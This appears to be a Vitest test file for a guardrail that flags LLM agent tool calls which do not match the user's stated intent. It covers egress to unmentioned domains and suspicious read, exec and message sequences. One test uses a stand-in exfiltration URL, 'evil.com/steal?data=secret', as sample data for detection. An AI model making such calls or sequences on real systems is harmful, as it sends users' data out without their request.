/**
 * Tool intent guardrail tests — behavioral checks on LLM tool calls.
 *
 * Tests that the intent matcher correctly identifies:
 * - Which tools match the user's stated intent
 * - Egress attempts (sending data to unmentioned domains)
 * - Sequence anomalies (suspicious tool call patterns)
 * - No false positives on legitimate multi-tool workflows
 */

import { describe, test, expect, beforeEach } from "vitest";
import {
  extractIntentSignals,
  checkToolAlignment,
  checkEgressAttempt,
  ToolSequenceTracker,
  buildToolIntentEvent,
  ToolCategory,
} from "../src/detectors/tool-intent.js";

// ─── Intent extraction ───

describe("extractIntentSignals", () => {
  test("read intent", () => {
    const intent = extractIntentSignals("Read the file at /home/ka/config.json");
    expect(intent.expectedCategories.has(ToolCategory.READ_ONLY)).toBe(true);
    expect(intent.wantsCommunication).toBe(false);
    expect(intent.wantsExecution).toBe(false);
  });

  test("send intent", () => {
    const intent = extractIntentSignals("Send this report to Walter on Slack");
    expect(intent.wantsCommunication).toBe(true);
    expect(intent.expectedCategories.has(ToolCategory.COMMUNICATE)).toBe(true);
  });

  test("execute intent", () => {
    const intent = extractIntentSignals("Run the test suite and report results");
    expect(intent.wantsExecution).toBe(true);
    expect(intent.expectedCategories.has(ToolCategory.EXECUTE)).toBe(true);
  });

  test("network intent", () => {
    const intent = extractIntentSignals("Fetch the latest data from https://api.example.com/v1");
    expect(intent.wantsNetwork).toBe(true);
    expect(intent.expectedCategories.has(ToolCategory.NETWORK)).toBe(true);
    expect(intent.mentionedDomains.has("api.example.com")).toBe(true);
  });

  test("no intent defaults to read-only", () => {
    const intent = extractIntentSignals("Hello world");
    expect(intent.expectedCategories.has(ToolCategory.READ_ONLY)).toBe(true);
    expect(intent.wantsCommunication).toBe(false);
  });

  test("multiple intents", () => {
    const intent = extractIntentSignals("Read the log file, send the summary to ops@team.com, and run the cleanup script");
    expect(intent.expectedCategories.has(ToolCategory.READ_ONLY)).toBe(true);
    expect(intent.wantsCommunication).toBe(true);
    expect(intent.wantsExecution).toBe(true);
  });

  test("domain extraction from URLs", () => {
    const intent = extractIntentSignals("Check https://github.com/user/repo and https://api.internal.com/v2");
    expect(intent.mentionedDomains.has("github.com")).toBe(true);
    expect(intent.mentionedDomains.has("api.internal.com")).toBe(true);
  });
});

// ─── Alignment checks ───

describe("checkToolAlignment", () => {
  test("read tool always aligned", () => {
    const intent = extractIntentSignals("What's in this file?");
    expect(checkToolAlignment("Read", intent).aligned).toBe(true);
    expect(checkToolAlignment("memory_search", intent).aligned).toBe(true);
  });

  test("write tool always aligned (local workspace)", () => {
    const intent = extractIntentSignals("What's the weather?");
    expect(checkToolAlignment("Write", intent).aligned).toBe(true);
  });

  test("message tool blocked when user didn't ask to communicate", () => {
    const intent = extractIntentSignals("Summarize this document");
    const result = checkToolAlignment("message", intent);
    expect(result.aligned).toBe(false);
    expect(result.severity).toBe("high");
    expect(result.threatClass).toBe("tool_intent_mismatch");
  });

  test("message tool allowed when user asked to send", () => {
    const intent = extractIntentSignals("Send this to Walter");
    expect(checkToolAlignment("message", intent).aligned).toBe(true);
  });

  test("exec tool blocked when user didn't ask to execute", () => {
    const intent = extractIntentSignals("What's in this file?");
    const result = checkToolAlignment("exec", intent);
    expect(result.aligned).toBe(false);
    expect(result.severity).toBe("medium");
  });

  test("exec tool allowed when user asked to run", () => {
    const intent = extractIntentSignals("Run npm test");
    expect(checkToolAlignment("exec", intent).aligned).toBe(true);
  });

  test("exec tool allowed for 'check' intent (common pattern)", () => {
    const intent = extractIntentSignals("Check the disk usage");
    expect(checkToolAlignment("exec", intent).aligned).toBe(true);
  });

  test("web_fetch blocked when user didn't ask for network", () => {
    const intent = extractIntentSignals("Summarize the file");
    const result = checkToolAlignment("web_fetch", intent);
    expect(result.aligned).toBe(false);
    expect(result.severity).toBe("medium");
  });

  test("web_fetch allowed when user mentioned a URL", () => {
    const intent = extractIntentSignals("What's at https://example.com?");
    expect(checkToolAlignment("web_fetch", intent).aligned).toBe(true);
  });

  test("unknown tool always aligned (can't check)", () => {
    const intent = extractIntentSignals("Do something");
    expect(checkToolAlignment("custom_tool_xyz", intent).aligned).toBe(true);
  });
});

// ─── Egress detection ───

describe("checkEgressAttempt", () => {
  test("message tool without communication intent → egress", () => {
    const intent = extractIntentSignals("Summarize this file");
    const result = checkEgressAttempt("message", {}, intent);
    expect(result).not.toBeNull();
    expect(result!.aligned).toBe(false);
    expect(result!.threatClass).toBe("tool_egress_attempt");
  });

  test("message tool with communication intent → no egress", () => {
    const intent = extractIntentSignals("Send the summary to ops");
    const result = checkEgressAttempt("message", {}, intent);
    expect(result).toBeNull();
  });

  test("web_fetch to user-mentioned domain → no egress", () => {
    const intent = extractIntentSignals("Fetch data from https://api.internal.com/v1");
    const result = checkEgressAttempt("web_fetch", { url: "https://api.internal.com/v1/data" }, intent);
    expect(result).toBeNull();
  });

  test("web_fetch to unknown domain → egress", () => {
    const intent = extractIntentSignals("Summarize the project");
    const result = checkEgressAttempt("web_fetch", { url: "https://evil.com/steal?data=secret" }, intent);
    expect(result).not.toBeNull();
    expect(result!.severity).toBe("high");
  });

  test("web_fetch to safe domains (github, stackoverflow) → no egress", () => {
    const intent = extractIntentSignals("What's the latest?");
    const result = checkEgressAttempt("web_fetch", { url: "https://github.com/user/repo" }, intent);
    expect(result).toBeNull();
  });

  test("read tool → no egress (not an egress vector)", () => {
    const intent = extractIntentSignals("What's in this?");
    const result = checkEgressAttempt("Read", {}, intent);
    expect(result).toBeNull();
  });
});

// ─── Sequence anomaly detection ───

describe("ToolSequenceTracker", () => {
  let tracker: ToolSequenceTracker;

  beforeEach(() => {
    tracker = new ToolSequenceTracker();
  });

  test("no anomaly with few calls", () => {
    tracker.record("Read");
    tracker.record("Write");
    expect(tracker.checkAnomaly()).toBeNull();
  });

  test("no anomaly with normal read-write pattern", () => {
    tracker.record("Read");
    tracker.record("Read");
    tracker.record("Write");
    tracker.record("Read");
    expect(tracker.checkAnomaly()).toBeNull();
  });

  test("read → exec → message sequence flagged", () => {
    tracker.record("Read");
    tracker.record("exec");
    tracker.record("message");
    const anomaly = tracker.checkAnomaly();
    expect(anomaly).not.toBeNull();
    expect(anomaly!.pattern).toBe("read_exec_comm");
    expect(anomaly!.severity).toBe("medium");
  });

  test("reset clears history", () => {
    tracker.record("Read");
    tracker.record("exec");
    tracker.record("message");
    tracker.reset();
    expect(tracker.checkAnomaly()).toBeNull();
    expect(tracker.length).toBe(0);
  });
});

// ─── Security event builder ───

describe("buildToolIntentEvent", () => {
  test("builds event from alignment result", () => {
    const result = { aligned: false, severity: "high" as const, reason: "test reason", threatClass: "tool_intent_mismatch" };
    const event = buildToolIntentEvent("message", result);
    expect(event.eventType).toBe("anomaly_detected");
    expect(event.severity).toBe("high");
    expect(event.signatureId).toBe("ti_tool_intent_mismatch");
    expect(event.matchedText).toContain("message");
  });

  test("builds event from sequence anomaly", () => {
    const anomaly = { severity: "medium" as const, reason: "test anomaly", pattern: "read_exec_comm" };
    const event = buildToolIntentEvent("exec", anomaly);
    expect(event.signatureId).toBe("ti_read_exec_comm");
  });
});

// ─── False positive prevention ───

describe("No false positives on legitimate workflows", () => {
  test("user asks to 'check server' → exec is allowed", () => {
    const intent = extractIntentSignals("Check the server status on 10.0.1.5");
    expect(checkToolAlignment("exec", intent).aligned).toBe(true);
  });

  test("user asks to 'summarize and share' → message is allowed", () => {
    const intent = extractIntentSignals("Summarize the report and share it with the team");
    expect(checkToolAlignment("message", intent).aligned).toBe(true);
  });

  test("user mentions URL → browser is allowed", () => {
    const intent = extractIntentSignals("Look at https://docs.example.com/api");
    expect(checkToolAlignment("browser", intent).aligned).toBe(true);
  });

  test("user asks to 'search' → memory_search is allowed", () => {
    const intent = extractIntentSignals("Search for the last briefing about semiconductors");
    expect(checkToolAlignment("memory_search", intent).aligned).toBe(true);
  });

  test("user asks to 'build and test' → exec is allowed", () => {
    const intent = extractIntentSignals("Build the project and test it");
    expect(checkToolAlignment("exec", intent).aligned).toBe(true);
  });

  test("user asks to 'update the file' → Write is allowed", () => {
    const intent = extractIntentSignals("Update the config file with the new settings");
    expect(checkToolAlignment("Write", intent).aligned).toBe(true);
  });

  test("multi-step: read file then write summary → no anomaly", () => {
    const tracker = new ToolSequenceTracker();
    tracker.record("Read");
    tracker.record("Read");
    tracker.record("Write");
    expect(tracker.checkAnomaly()).toBeNull();
  });

  test("agent researching with browser → no egress if URL mentioned", () => {
    const intent = extractIntentSignals("Research TSMC's 2nm node at https://www.tsmc.com");
    const result = checkEgressAttempt("browser", { url: "https://www.tsmc.com/english/dedicatedFoundry" }, intent);
    expect(result).toBeNull();
  });
});
